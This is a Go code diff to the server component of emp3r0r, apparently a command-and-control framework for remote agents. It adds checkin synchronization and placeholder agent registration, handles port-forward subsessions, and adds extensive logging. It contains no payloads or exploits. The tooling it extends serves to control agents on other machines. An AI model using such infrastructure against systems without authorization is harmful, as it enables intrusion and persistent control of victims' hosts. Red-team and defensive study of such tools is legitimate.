@@ -18,6 +18,7 @@ import (
 	"github.com/gorilla/mux"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
+	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
@@ -27,6 +28,10 @@ import (
 
 // replayNonceCache tracks nonces within the replay window.
 var replayNonceCache sync.Map
+
+// checkinReadyChannels tracks pending checkin completions by agent UUID
+// Channel is closed when public key is stored, waking up waiting requests
+var checkinReadyChannels sync.Map // map[string]chan struct{}
 
 // verifyAgentCAOnly validates CA signature only (for new agent checkin/TOFU).
 // This allows new agents to check in without their public key being known yet.
@@ -182,14 +187,36 @@ func verifyAgentRequest(wrt http.ResponseWriter, req *http.Request, expectedAgen
 }
 
 func resolveAgentPublicKey(agentUUID string) (string, error) {
+	logging.Infof("resolveAgentPublicKey: attempting to resolve key for agent %s", strconv.Quote(agentUUID))
+
+	// Check if there's a pending checkin for this agent
+	if readyChanVal, exists := checkinReadyChannels.Load(agentUUID); exists {
+		readyChan := readyChanVal.(chan struct{})
+		logging.Infof("resolveAgentPublicKey: waiting for checkin to complete for %s", strconv.Quote(agentUUID))
+
+		// Wait for checkin handler to signal completion (or timeout)
+		select {
+		case <-readyChan:
+			logging.Infof("resolveAgentPublicKey: checkin completed for %s, retrieving key", strconv.Quote(agentUUID))
+		case <-time.After(5 * time.Second):
+			logging.Warningf("resolveAgentPublicKey: timeout waiting for checkin to complete for %s", strconv.Quote(agentUUID))
+			return "", fmt.Errorf("timeout waiting for checkin to complete")
+		}
+	}
+
+	// Now retrieve the public key (should be available after channel closed)
 	if agent := agents.GetAgentByUUID(agentUUID); agent != nil {
 		if logging.Level >= 4 {
 			logging.Debugf("resolveAgentPublicKey: found agent %s in memory, pubkey length=%d", strconv.Quote(agentUUID), len(agent.PublicKey))
 		}
 		if agent.PublicKey != "" {
+			logging.Infof("resolveAgentPublicKey: successfully resolved key from memory for %s", strconv.Quote(agentUUID))
 			return agent.PublicKey, nil
 		}
 	}
+
+	// Fallback to database
+	logging.Warningf("resolveAgentPublicKey: agent %s not found in memory, trying database", strconv.Quote(agentUUID))
 	if agents.AgentDB != nil {
 		stored, err := agents.GetStoredAgent(agentUUID)
 		if err != nil {
@@ -200,10 +227,12 @@ func resolveAgentPublicKey(agentUUID string) (string, error) {
 				logging.Debugf("resolveAgentPublicKey: found agent %s in DB, pubkey length=%d", strconv.Quote(agentUUID), len(stored.PublicKey))
 			}
 			if stored.PublicKey != "" {
+				logging.Infof("resolveAgentPublicKey: successfully resolved key from DB for %s", strconv.Quote(agentUUID))
 				return stored.PublicKey, nil
 			}
 		}
 	}
+	logging.Errorf("resolveAgentPublicKey: public key for agent %s not found in memory or DB", strconv.Quote(agentUUID))
 	return "", fmt.Errorf("public key for agent %s not found", agentUUID)
 }
 
@@ -211,7 +240,14 @@ func validatePortFwdSessionOwner(sessionID, agentUUID string) bool {
 	if sessionID == "" {
 		return false
 	}
-	val, ok := network.PortFwds.Load(sessionID)
+	
+	// Extract base session ID (subsessions have format: sessionID_portNumber)
+	baseSessionID := sessionID
+	if strings.Contains(sessionID, "_") {
+		baseSessionID = strings.Split(sessionID, "_")[0]
+	}
+	
+	val, ok := network.PortFwds.Load(baseSessionID)
 	if !ok {
 		return false
 	}
@@ -256,11 +292,17 @@ func apiDispatcher(wrt http.ResponseWriter, req *http.Request) {
 	if checkinPath == "" {
 		checkinPath = "checkin"
 	}
+	if logging.Level >= 4 {
+		logging.Debugf("apiDispatcher: checkinPath configured as %s", strconv.Quote(checkinPath))
+	}
 
 	// msg path
 	msgPath := live.RuntimeConfig.MsgPath
 	if msgPath == "" {
 		msgPath = "msg"
+	}
+	if logging.Level >= 4 {
+		logging.Debugf("apiDispatcher: msgPath configured as %s, incoming api=%s", strconv.Quote(msgPath), strconv.Quote(vars["api"]))
 	}
 
 	// ftp path
@@ -345,14 +387,34 @@ func apiDispatcher(wrt http.ResponseWriter, req *http.Request) {
 	req = req.WithContext(req.Context())
 
 	// handlers
+	logging.Infof("apiDispatcher: routing request to api=%s, token=%s", strconv.Quote(vars["api"]), strconv.Quote(vars["token"]))
 	switch vars["api"] {
 	case checkinPath:
+		logging.Infof("apiDispatcher: routing to handleAgentCheckIn (checkin path)")
 		// Checkin uses CA-only validation (TOFU: agent public key sent in CBOR body)
-		if _, ok := verifyAgentCAOnly(wrt, req); !ok {
+		agentUUID, ok := verifyAgentCAOnly(wrt, req)
+		if !ok {
 			return
+		}
+
+		// Create synchronization channel for this checkin
+		// Handler will close it when public key is stored
+		readyChan := make(chan struct{})
+		checkinReadyChannels.Store(agentUUID, readyChan)
+
+		// Pre-register agent placeholder to prevent race condition
+		if !agents.IsAgentExistByUUID(agentUUID) {
+			logging.Infof("Pre-registering agent %s before checkin handler processes CBOR body", strconv.Quote(agentUUID))
+			placeholder := &def.Emp3r0rAgent{
+				UUID:      agentUUID,
+				PublicKey: "", // Will be filled by handler after CBOR decode
+			}
+			inx := agents.AssignAgentIndex()
+			live.AgentControlMap.Store(placeholder, &live.AgentControl{Index: inx, Conn: nil})
 		}
 		handleAgentCheckIn(wrt, req)
 	case msgPath:
+		logging.Infof("apiDispatcher: routing to handleMessageTunnel (msg path)")
 		// Message tunnel requires full validation (agent must have checked in first)
 		// Token in URL is session/connection identifier, not necessarily agent UUID
 		if !verifyAgentRequest(wrt, req, "", nil) {
